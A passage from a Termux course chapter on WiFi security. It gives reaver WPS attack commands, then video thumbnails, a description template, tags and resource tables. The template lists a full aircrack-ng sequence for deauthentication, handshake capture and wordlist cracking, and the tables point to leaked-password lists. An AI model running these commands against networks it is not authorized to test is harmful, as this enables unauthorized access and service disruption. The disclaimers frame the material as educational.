# Solution 4: Use specific options
reaver -i wlan0mon -b BSSID -c CHANNEL -S -N -vv

# Solution 5: Pixie Dust attack (some routers)
reaver -i wlan0mon -b BSSID -c CHANNEL -K

# Note: Many modern routers have WPS lock protection
# WPS attacks may not work on newer devices
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: WiFi Security Professional**
```
┌────────────────────────────────────┐
│  [Dark Terminal Background]        │
│                                    │
│   📡 WIFI SECURITY TOOLS           │
│                                    │
│   🔓 WPA2 Cracking                 │
│   📶 Monitor Mode                  │
│   🛡️ Secure Your Network           │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Lock Breaking Visual**
```
┌────────────────────────────────────┐
│  [WiFi Icon with Breaking Lock]    │
│                                    │
│   🔐 → 🔓                          │
│                                    │
│   WIFI HACKING IN TERMUX           │
│                                    │
│   Complete aircrack-ng Guide       │
│   External Adapter Required        │
│                                    │
│   [T3rmuxk1ng]                     │
└────────────────────────────────────┘
```

**Option C: Warning Style**
```
┌────────────────────────────────────┐
│  ⚠️ ETHICAL HACKING ONLY           │
│                                    │
│   WIFI SECURITY TOOLS              │
│                                    │
│   ✓ Handshake Capture              │
│   ✓ WPA2 Cracking                  │
│   ✓ Network Auditing               │
│                                    │
│   Chapter 38 | T3rmuxk1ng          │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
📡 Termux Full Course - Chapter 38: WiFi Security Tools | Complete Guide

🔥 In this video you'll learn:
• WiFi security fundamentals
• Encryption types (WEP, WPA, WPA2, WPA3)
• Monitor mode and external adapter setup
• aircrack-ng suite complete tutorial
• WPA2 handshake capture and cracking
• WPS attacks with reaver
• How to secure your WiFi network
• Tools that work without root

⚠️ DISCLAIMER: This video is for EDUCATIONAL PURPOSES ONLY.
Use these techniques ONLY on networks you own or have written permission to test.
Unauthorized WiFi hacking is ILLEGAL and can result in serious consequences.

⏱️ Timestamps:
0:00 - Introduction
1:00 - WiFi Security Fundamentals
4:30 - Encryption Types (WEP/WPA/WPA2/WPA3)
9:00 - Monitor Mode & Hardware Requirements
12:30 - aircrack-ng Installation
15:00 - Network Scanning
17:30 - Handshake Capture & Cracking
21:00 - WPS Attacks
23:00 - WiFi Deauthentication
24:30 - No-Root Alternatives
26:30 - Securing Your WiFi
29:00 - Summary

📥 Required Hardware:
• External WiFi Adapter (Alfa, TP-Link, Panda)
• USB OTG Adapter
• Optional: Powered USB Hub

📝 Commands from this video:
pkg install aircrack-ng -y
airmon-ng start wlan1
airodump-ng wlan1mon
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan1mon
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan1mon
aircrack-ng -w wordlist.txt capture-01.cap

📚 Useful Links:
• rockyou wordlist: https://github.com/danielmiessler/SecLists
• WiFi Pineapple: https://shop.hak5.org
• aircrack-ng docs: https://www.aircrack-ng.org

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#Termux #WiFiSecurity #WiFiHacking #aircrack-ng #WPA2 #T3rmuxk1ng #EthicalHacking #CyberSecurity #TermuxCourse

---
⚠️ Disclaimer: This video is for educational purposes only. Always practice ethical hacking and only test systems you own or have explicit permission to test.
```

### Tags List

```
wifi security, wifi hacking, aircrack-ng, termux wifi, wpa2 crack,
wifi password hack, monitor mode, wifi adapter, handshake capture,
termux hacking, ethical hacking, cybersecurity, wifi penetration testing,
network security, wpa3, wps attack, reaver, airodump-ng, aireplay-ng,
wifi cracking, wifi security audit, termux course, t3rmuxk1ng,
android wifi hack, external wifi adapter, otg wifi adapter,
wifi security tools, wireless security, network auditing,
wifi deauthentication, wifi encryption, wep wpa wpa2 wpa3
```

### Hashtags

```
#WiFiSecurity #WiFiHacking #aircrack-ng #Termux #TermuxCourse
#EthicalHacking #CyberSecurity #WPA2 #MonitorMode #NetworkSecurity
#T3rmuxk1ng #WiFiPenetrationTesting #WirelessSecurity #HandshakeCapture
#WPACracking #SecurityTools #PenetrationTesting #InfoSec
```

---

## 📚 ADDITIONAL RESOURCES

### Official Resources

| Resource | Link |
|----------|------|
| aircrack-ng Official | https://www.aircrack-ng.org/ |
| aircrack-ng Wiki | https://wiki.aircrack-ng.org/ |
| aircrack-ng GitHub | https://github.com/aircrack-ng/aircrack-ng |
| WiFi Pineapple | https://shop.hak5.org/ |

### Learning Resources

| Resource | Description |
|----------|-------------|
| aircrack-ng Documentation | Complete tool documentation |
| SecLists GitHub | Wordlists and security resources |
| Hak5 Videos | WiFi security tutorials |
| WiFi Security Books | "Hacking Exposed Wireless" |

### Wordlist Downloads

| Wordlist | Size | Description |
|----------|------|-------------|
| rockyou.txt | 134MB | 14M leaked passwords |
| darkc0de.lst | 1.8GB | Large password list |
| CrackStation | 15GB | Massive wordlist |
| SecLists | Various | Multiple wordlists |

### WiFi Adapter Recommendations

| Adapter | Chipset | Price Range | Notes |
|---------|---------|-------------|-------|
| Alfa AWUS036NHA | Atheros AR9271 | $25-35 | Best for Termux |
| TP-Link TL-WN722N v1 | Atheros AR9271 | $15-25 | Check version |
| Panda PAU05 | Ralink RT3070 | $15-20 | Budget friendly |
| Alfa AWUS036NAC | Realtek RTL8812AU | $35-50 | AC supported |

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 39, verify:

- [ ] Understood WiFi security fundamentals
- [ ] Know encryption types (WEP, WPA, WPA2, WPA3) and their security levels
- [ ] Understand monitor mode requirements
- [ ] Installed aircrack-ng suite
- [ ] Know how to use airmon-ng, airodump-ng, aireplay-ng
- [ ] Understand WPA2 handshake capture process
- [ ] Know how to crack captured handshakes
- [ ] Aware of WPS vulnerabilities
- [ ] Understand deauthentication attacks
- [ ] Know how to secure your own WiFi
- [ ] Understand legal and ethical implications

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 39: Bluetooth Security**

- Bluetooth technology overview
- Bluetooth vulnerabilities
- BlueBorne attack
- BLE device security
- Bluetooth reconnaissance tools
- Bluetooth hacking in Termux
- Securing Bluetooth devices
- Tools: bluez, btscanner, spooftooph

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*
